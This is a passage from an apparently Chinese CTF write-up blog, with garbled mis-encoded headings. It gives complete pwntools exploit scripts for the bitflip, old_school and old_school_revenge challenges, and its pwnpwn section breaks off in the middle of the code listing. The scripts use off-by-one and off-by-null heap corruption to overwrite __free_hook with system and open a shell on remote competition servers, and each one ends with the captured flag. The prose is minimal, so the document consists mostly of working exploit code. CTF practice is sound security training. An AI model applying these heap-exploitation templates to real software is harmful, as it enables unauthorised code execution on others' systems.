<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./bitflip&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;124.71.130.185&quot;,&quot;49155&quot;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;Your choice: &quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line">def add(idx,size):</span><br><span class="line">	sla(menu,&#x27;1&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">	sla(&#x27;Size: &#x27;,str(size))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">	sla(menu,&#x27;2&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">	sla(&#x27;Content: &#x27;,con)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(menu,&#x27;3&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">def delete(idx):</span><br><span class="line">	sla(menu,&#x27;4&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line"> 	add(i,0x38)</span><br><span class="line"></span><br><span class="line">for i in range(8,12):</span><br><span class="line"> 	add(i,0x38)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line"> 	edit(i,(0x38)*&quot;\x11&quot;+&#x27;\xe1&#x27;)</span><br><span class="line"></span><br><span class="line">edit(11,&quot;\x21&quot;*0x18+p64(0x21))</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line"> 	delete(i+1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(12,0x38)</span><br><span class="line">show(12)</span><br><span class="line">libc_base = u64Leakbase(304+0x10+libc.sym[&#x27;__malloc_hook&#x27;])</span><br><span class="line"></span><br><span class="line">__free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">lg(&quot;libc_base&quot;,libc_base)</span><br><span class="line">lg(&quot;__free_hook_addr&quot;,__free_hook_addr)</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line"></span><br><span class="line">add(13,0x38)</span><br><span class="line">delete(10)</span><br><span class="line">delete(13)</span><br><span class="line">edit(9,p64(__free_hook_addr))</span><br><span class="line">add(14,0x38)</span><br><span class="line">add(15,0x38)</span><br><span class="line">edit(15,p64(system_addr))</span><br><span class="line">edit(0,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line">#flag&#123;2296341872d87bd532c121d14d55c4ac&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="ä¸‰ã€old-school"   >
          <a href="#ä¸‰ã€old-school" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€old-school" class="headerlink" title="ä¸‰ã€old_school"></a>ä¸‰ã€old_school</h1>
      <p>å¾ˆå¸¸è§„ï¼Œ2.27çš„off by oneï¼Œç›´æ¥æ‹¿off by nullçš„æ¨¡æ¿æ”¹äº†ï¼Œå…¶å®ç”¨ä¸Šé¢bitflipçš„æ¨¡æ¿ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ”¹sizeã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./old_school&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;121.36.194.21&quot;,49155)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;Your choice: &quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line">def add(idx,size):</span><br><span class="line">	sla(menu, &quot;1&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line">	sla(&quot;Size: &quot;, str(size))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	sla(menu, &quot;4&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sla(menu, &quot;3&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">	sla(menu, &quot;2&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line">	sa(&quot;Content: &quot;, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0x7):</span><br><span class="line">	add(i,0xf8)</span><br><span class="line"></span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	add(i,0x98)</span><br><span class="line"></span><br><span class="line">add(0x14,0xf8)	#0x14</span><br><span class="line"></span><br><span class="line">add(0x15,0x98)	#0x15</span><br><span class="line">add(0x16,0xe8)	#0x16</span><br><span class="line">add(0x17,0xe8)	#0x17</span><br><span class="line">add(0x18,0xf8)	#0x18</span><br><span class="line">add(0x19,0xf8)	#0x19</span><br><span class="line">add(0x1a,0xf8)	#0x1a</span><br><span class="line"></span><br><span class="line">for i in range(0x7):</span><br><span class="line">	delete(i)</span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(0x15)</span><br><span class="line">#prented off by null</span><br><span class="line">edit(0x18,&#x27;\x33&#x27;*0xf0+p64(0x300+0xa0-0x10-0x10)+&#x27;\x00&#x27;+&#x27;\n&#x27;)</span><br><span class="line">delete(0x19)</span><br><span class="line"></span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	add(i,0x98)</span><br><span class="line"></span><br><span class="line">add(0x1b,0x98)</span><br><span class="line">sleep(1)</span><br><span class="line">show(0x1b)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">libc_base = u64Leakbase(0x3ec0b0)</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">one = libc_base + 0x4f432</span><br><span class="line">lg(&quot;libc_base&quot;,libc_base)</span><br><span class="line">lg(&quot;free_hook&quot;,free_hook)</span><br><span class="line">lg(&quot;system&quot;,system)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">add(0x1c,0xe8)</span><br><span class="line">add(0x1d,0xe8)</span><br><span class="line">delete(0x1d)</span><br><span class="line">delete(0x1c)</span><br><span class="line">edit(0x16,p64(free_hook)+&#x27;\n&#x27;)</span><br><span class="line">add(0x1e,0xe8)</span><br><span class="line">add(0x1f,0xe8)</span><br><span class="line">edit(0x1f,p64(system)+&#x27;\n&#x27;)</span><br><span class="line">edit(0x14,&#x27;/bin/sh\x00&#x27;+&quot;A&quot;*0x10+&#x27;\n&#x27;)</span><br><span class="line">delete(0x14)</span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line">#flag&#123;m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="å››ã€old-school-revenge"   >
          <a href="#å››ã€old-school-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€old-school-revenge" class="headerlink" title="å››ã€old_school_revenge"></a>å››ã€old_school_revenge</h1>
      <p>åˆšå¥½åˆå‡ºäº†ä¸ªoff by nullï¼ŒåŒæ ·å°±æ˜¯æ¨¡æ¿æ‰“</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./old_school_revenge&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;123.60.63.39&quot;,49155)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;Your choice: &quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">	sla(menu, &quot;1&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line">	sla(&quot;Size: &quot;, str(size))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	sla(menu, &quot;4&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sla(menu, &quot;3&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">	sla(menu, &quot;2&quot;)</span><br><span class="line">	sla(&quot;Index: &quot;, str(idx))</span><br><span class="line">	sla(&quot;Content: &quot;, con)</span><br><span class="line"></span><br><span class="line">for i in range(0x7):</span><br><span class="line">	add(i,0xf8)</span><br><span class="line"></span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	add(i,0x98)</span><br><span class="line"></span><br><span class="line">add(0x14,0xf8)	#0x14</span><br><span class="line"></span><br><span class="line">add(0x15,0x98)	#0x15</span><br><span class="line">add(0x16,0xe8)	#0x16</span><br><span class="line">add(0x17,0xe8)	#0x17</span><br><span class="line">add(0x18,0xf8)	#0x18</span><br><span class="line">add(0x19,0xf8)	#0x19</span><br><span class="line">add(0x1a,0xf8)	#0x1a</span><br><span class="line"></span><br><span class="line">for i in range(0x7):</span><br><span class="line">	delete(i)</span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(0x15)</span><br><span class="line">#off by null</span><br><span class="line">edit(0x18,&#x27;\x22&#x27;*0xf0+p64(0x300+0xa0-0x10-0x10))</span><br><span class="line">delete(0x19)</span><br><span class="line"></span><br><span class="line">for i in range(0x7,0x7+0x7):</span><br><span class="line">	add(i,0x98)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x1b,0x98)</span><br><span class="line">sleep(1)</span><br><span class="line">show(0x1b)</span><br><span class="line">ru(&quot;Content: &quot;)</span><br><span class="line">libc_base = u64Leakbase(0x3ec0b0)</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">lg(&quot;libc_base&quot;,libc_base)</span><br><span class="line">lg(&quot;free_hook&quot;,free_hook)</span><br><span class="line">lg(&quot;system&quot;,system)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">add(0x1c,0xe8)</span><br><span class="line">add(0x1d,0xe8)</span><br><span class="line">delete(0x1d)</span><br><span class="line">delete(0x1c)</span><br><span class="line">edit(0x16,p64(free_hook))</span><br><span class="line">add(0x1e,0xe8)</span><br><span class="line">add(0x1f,0xe8)</span><br><span class="line">edit(0x1f,p64(system))</span><br><span class="line">edit(0x14,&#x27;/bin/sh\x00&#x27;+&quot;\x11&quot;*0x10)</span><br><span class="line">delete(0x14)</span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line">#flag&#123;chz1IrUaAgSELXLciMeRB2XMeWQVZAKl&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="äº”ã€pwnpwn"   >
          <a href="#äº”ã€pwnpwn" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€pwnpwn" class="headerlink" title="äº”ã€pwnpwn"></a>äº”ã€pwnpwn</h1>
      <p>æ³„éœ²canaryåç›´æ¥ret2pltå³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 